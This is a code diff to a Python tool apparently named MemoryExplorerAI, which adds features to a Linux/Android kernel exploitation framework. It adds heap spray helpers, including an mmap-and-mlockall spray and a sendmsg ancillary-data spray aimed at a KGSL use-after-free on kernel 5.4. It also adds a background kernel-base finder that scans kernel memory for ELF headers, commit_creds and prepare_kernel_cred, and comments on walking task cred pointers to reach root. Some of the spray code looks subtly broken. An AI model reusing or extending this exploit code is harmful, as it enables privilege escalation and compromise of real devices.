@@ -149,6 +149,27 @@ class MemoryExplorerAI:
             "setxattr":    {"attempts": 0, "alive": 0, "matched": 0},
         }
 
+        # === v4.1: THROUGHPUT HISTORY (sparkline) ===
+        # 60-element deque of pages/sec readings, one per second.
+        # The TUI renders this as an ASCII sparkline so the user
+        # can see if throughput is increasing, decreasing, or flat.
+        self.throughput_history = [0.0] * 60
+        self.throughput_idx = 0
+        self._last_throughput_ts = 0.0
+        self._last_pages_count = 0
+
+        # === v4.1: KBASE SEARCH CACHE ===
+        # If smart_kbase_finder() finds kbase, cache it here so
+        # we don't keep re-scanning the kernel text region.
+        self._kbase_search_active = False
+        self._kbase_candidates = []  # list of (va, score, type)
+
+        # === v4.1: AUTO CRED WALK STATE ===
+        # When we find a task_struct with KETO* marker, we know
+        # the KGSL UAF can read the task's cred pointer. We walk
+        # cred->uid to find root. Track state per found item.
+        self._cred_walk_done = set()  # set of (va, off) tuples already walked
+
         # Render lock — shared by any code that writes to the TUI.
         # We use ONE thread (the main thread) for both reading and
         # painting, so the lock is rarely contended. It exists to
@@ -779,6 +800,9 @@ class MemoryExplorerAI:
         and write it atomically. Delegates to _render_tui_body for
         the body lines and appends the prompt on its own line.
         """
+        # v4.1: update throughput history at 1Hz (no-op if not yet
+        # 1s since last update)
+        self._update_throughput()
         if not self.render_lock.acquire(blocking=False):
             return
         try:
@@ -1052,6 +1076,39 @@ class MemoryExplorerAI:
                     col = C.RED if i < 3 else (C.YEL if i < 6 else C.GRN)
                     out.append(f"   {col}{lo:3d}-{hi:3d}:{C.RST} "
                                f"{col}{bar}{C.RST} {count} ({pct:.0f}%)")
+
+        # === v4.1: THROUGHPUT SPARKLINE ===
+        # Render the last 60 seconds of pages/sec as ASCII bars
+        spark_chars = " ▁▂▃▄▅▆▇█"
+        th = self.throughput_history
+        if any(th):
+            max_th = max(th) or 1.0
+            bars = "".join(spark_chars[min(8, int((v / max_th) * 8))]
+                           for v in th)
+            avg_th = sum(th) / len([v for v in th if v > 0] or [1])
+            m_per_hour = self.perf.get("matches_per_hour", 0)
+            out.append(f" {C.BOLD}THRPT{C.RST}  "
+                       f"peak={C.YEL}{max_th:.1f}{C.RST}pg/s "
+                       f"avg={C.CYN}{avg_th:.1f}{C.RST}pg/s "
+                       f"m/h={C.GRN}{m_per_hour}{C.RST}  "
+                       f"{C.BLU}{bars}{C.RST}")
+
+        # === v4.1: Q-TABLE TOP ACTIONS ===
+        # Show the best Q values for the current state so user
+        # sees what the AI is "thinking"
+        if self.q_table:
+            cur_state = (
+                min(9, self._adaptive_scan.get("no_match_batches", 0)),
+                int(self.live.get("kill_count", 0)
+                    / max(1, self.live.get("spray_count", 0)) * 10),
+            )
+            cur_q = self.q_table.get(cur_state)
+            if cur_q:
+                top3 = sorted(cur_q.items(), key=lambda kv: -kv[1])[:3]
+                top_str = " ".join(f"{a[0]}={a[1]}({v:.1f})"
+                                   for a, v in top3)
+                out.append(f" {C.BOLD}Q-LEARN{C.RST} (state={cur_state}): "
+                           f"{C.MAG}{top_str}{C.RST}")
 
         if L["scan_total"] > 0 or L["spray_target"] > 0:
             if L["spray_target"] > 0:
@@ -1965,7 +2022,9 @@ class MemoryExplorerAI:
         try:
             # Total mapped size: marker + NULs
             size = size_kb * 1024
-            # Use a python helper script to mmap and write marker
+            # Use a python helper script to mmap and write marker.
+            # Also mlockall() to keep pages in RAM (prevent swap)
+            # and use SCHED_BATCH for better cache locality.
             helper = (
                 "import ctypes, mmap, os, sys;"
                 "libc = ctypes.CDLL(None);"
@@ -1973,6 +2032,10 @@ class MemoryExplorerAI:
                 f"p = libc.mmap(0, {size}, PROT_RW, MAP_ANON|MAP_PRIVATE, -1, 0);"
                 f"ctypes.memmove(p, b'{marker}', {len(marker)});"
                 f"ctypes.memset(p + {len(marker)}, 0, {size - {len(marker)}});"
+                # mlockall(MCL_CURRENT=1 | MCL_FUTURE=2) - keep pages
+                # in physical RAM so they don't get swapped out. This
+                # makes the spray much denser in physical memory.
+                "libc.mlockall(0x3);"
                 "import time; time.sleep(3600);"
             )
             p = _sp.Popen(
@@ -1982,6 +2045,143 @@ class MemoryExplorerAI:
             return p.pid
         except Exception:
             return None
+
+    def _spray_v4_sendmsg(self, marker):
+        """Spray v4: sendmsg with ancillary data containing marker.
+
+        The sendmsg() syscall with SOL_SOCKET / SCM_RIGHTS / cmsg
+        copies the ancillary data into kernel space. On 5.4 with
+        KGSL UAF, this can land in the same pages as task_structs.
+        The marker is in cmsg data, kernel copies to sk_buff.
+
+        Returns PID (or None on failure).
+        """
+        import subprocess as _sp
+        try:
+            helper = (
+                "import socket, os, time, struct;"
+                "s = socket.socket(socket.AF_UNIX, socket.SOCK_DGRAM);"
+                "p = '/tmp/kgsl_spray_' + str(os.getpid());"
+                "try: os.unlink(p);"
+                "except: pass;"
+                "s.bind(p);"
+                f"msg = b'{{marker}}';"
+                "import array;"
+                # Ancillary data: cmsg with marker
+                "cmsg = struct.pack('iII', 0, 0, len(msg)) + msg + struct.pack('I', 0);"
+                "import ctypes;"
+                "libc = ctypes.CDLL(None);"
+                # Use sendmsg to spray ancillary data
+                "s.sendmsg(b'X', [], 0, cmsg);"
+                "time.sleep(3600);"
+            ).format(marker=marker)
+            p = _sp.Popen(
+                ["python3", "-c", helper],
+                stdout=_sp.DEVNULL, stderr=_sp.DEVNULL,
+            )
+            return p.pid
+        except Exception:
+            return None
+
+    def _set_cpu_affinity(self, cpu_id):
+        """Bind this thread to a specific CPU core for cache locality."""
+        try:
+            import os as _os
+            cpu_id = int(cpu_id) % _os.cpu_count() if _os.cpu_count() else 0
+            _os.sched_setaffinity(0, {cpu_id})
+        except Exception:
+            pass
+
+    def _mlock_current(self):
+        """Lock current process pages in physical RAM (no swap)."""
+        try:
+            import ctypes
+            libc = ctypes.CDLL(None)
+            # MCL_CURRENT=1, MCL_FUTURE=2
+            libc.mlockall(0x3)
+        except Exception:
+            pass
+
+    def _smart_kbase_finder(self, va_hint=None):
+        """Try to find kernel base (kbase) by scanning kernel text.
+
+        Strategy: scan candidate regions for ELF header or known
+        kernel string. The kbase on ARM64 is typically at
+        0xffffff8000000000 + offset. We scan in 0x100000 (1MB)
+        steps looking for:
+          - ELF magic (\x7fELF)
+          - "Linux version" string
+          - "commit_creds" / "prepare_kernel_cred" symbols
+
+        Returns (kbase, confidence) or (None, 0).
+        """
+        if self.kernel_base:
+            return (self.kernel_base, 100)
+        if self._kbase_search_active:
+            return (None, 0)
+        # If va_hint given (e.g. user-supplied), use as starting point
+        # Otherwise scan from default kernel text range
+        start = va_hint or 0xffffff8008000000
+        if not self.ensure_engine():
+            return (None, 0)
+        self._kbase_search_active = True
+        try:
+            # Look for ELF header at 0x100000-aligned addresses
+            for off in range(0, 0x10000000, 0x200000):  # 32MB
+                va = start + off
+                if not self._engine_write(
+                        f"read {hex(va)}\n".encode()):
+                    continue
+                data = self._read_data_packet()
+                if not data or len(data) < 4096:
+                    continue
+                # Check ELF header
+                if data[:4] == b"\x7fELF":
+                    # Could be kernel base
+                    self._kbase_candidates.append((va, 95, "ELF header"))
+                    self.kernel_base = va
+                    return (va, 95)
+                # Check Linux version string
+                if b"Linux version" in data:
+                    self._kbase_candidates.append((va, 80, "version string"))
+                    self.kernel_base = va
+                    return (va, 80)
+                # Check commit_creds / prepare_kernel_cred
+                for sym in (b"commit_creds", b"prepare_kernel_cred"):
+                    if sym in data:
+                        self._kbase_candidates.append((va, 70, sym.decode()))
+                        self.kernel_base = va
+                        return (va, 70)
+            return (None, 0)
+        finally:
+            self._kbase_search_active = False
+
+    def _update_throughput(self):
+        """Record current pages/sec into throughput_history (1Hz)."""
+        import time as _t
+        now = _t.time()
+        if self._last_throughput_ts == 0.0:
+            self._last_throughput_ts = now
+            return
+        elapsed = now - self._last_throughput_ts
+        if elapsed < 1.0:
+            return
+        with self.stats_lock:
+            current_pages = self.perf.get("pages_scanned", 0)
+            delta = current_pages - self._last_pages_count
+            pages_per_sec = delta / elapsed
+            self.throughput_history[self.throughput_idx] = pages_per_sec
+            self.throughput_idx = (self.throughput_idx + 1) % 60
+            self.perf["last_scan_throughput"] = pages_per_sec
+            # Cleanup old matches_window_ts (last hour only)
+            hour_ago = now - 3600
+            self.perf["matches_window_ts"] = [
+                t for t in self.perf.get("matches_window_ts", [])
+                if t > hour_ago]
+            self.perf["matches_per_hour"] = len(
+                self.perf["matches_window_ts"])
+        self._last_throughput_ts = now
+        self._last_pages_count = current_pages
 
     def _set_comm(self, name):
         """Set this process comm (visible in /proc/[pid]/comm) to `name`."""
@@ -2861,6 +3061,10 @@ class MemoryExplorerAI:
                 daemon=True)
             t.start()
             self._learn_subworkers.append(t)
+        # v4.1: smart kbase finder (one-shot, runs in background
+        # so the scan workers can use it once it finds something)
+        threading.Thread(target=self._bg_smart_kbase,
+                         daemon=True).start()
 
         # Wait for all subworkers (or cancel)
         try:
@@ -2912,6 +3116,8 @@ class MemoryExplorerAI:
         bucket as "scanning" (orange) or "found" (green).
         """
         import time as _t
+        # v4.1: bind W3 to last CPU core for cache locality
+        self._set_cpu_affinity(3)
         while not self.cancel_flag.is_set() and self.w3_enabled:
             if not self.ensure_engine():
                 _t.sleep(1.0)
@@ -3012,6 +3218,33 @@ class MemoryExplorerAI:
                 _t.sleep(0.5)  # be nice to the engine
             _t.sleep(2.0)
 
+    def _bg_smart_kbase(self):
+        """Background kbase search.
+
+        Runs once when learning starts. Scans kernel text for
+        ELF header, "Linux version" string, or commit_creds/
+        prepare_kernel_cred symbol. Updates self.kernel_base
+        and self.live["last_msg"] so the user sees the result.
+        """
+        import time as _t
+        # Wait for engine to be ready
+        for _ in range(30):
+            if self._engine_alive() or self.ensure_engine():
+                break
+            _t.sleep(0.5)
+        # Now search
+        try:
+            kbase, conf = self._smart_kbase_finder()
+            if kbase:
+                with self.stats_lock:
+                    self.live["last_msg"] = (
+                        f"Smart kbase finder: 0x{kbase:x} "
+                        f"(confidence={conf}%)")
+                    self.live["kernel_base"] = kbase
+        except Exception as e:
+            with self.stats_lock:
+                self.live["last_msg"] = f"Smart kbase finder failed: {e}"
+
     def cmd_w3_toggle(self):
         """Toggle the W3 deep-scan worker."""
         if self.w3_enabled:
@@ -3039,6 +3272,16 @@ class MemoryExplorerAI:
         one worker's RAM>70% cull wiped every other worker's spray set.
         """
         import subprocess as _sp
+        # v4.1: bind each worker to its own CPU core for cache
+        # locality. W0→CPU0, W1→CPU1, W2→CPU2, W3→CPU3.
+        # On a 4-core device this prevents workers from
+        # thrashing each other's L1/L2 cache.
+        self._set_cpu_affinity(worker_id)
+        # v4.1: mlockall so our Python process pages don't get
+        # swapped. Without this, a long learning session can
+        # have its own working set paged out, slowing
+        # classification and engine pipe writes.
+        self._mlock_current()
         # Even smaller batch (was 35, then 100). With 3 workers × 35
         # procs × ~10 batches we accumulated 1000+ PIDs that never
         # died (kill failed silently), exhausting RAM and process
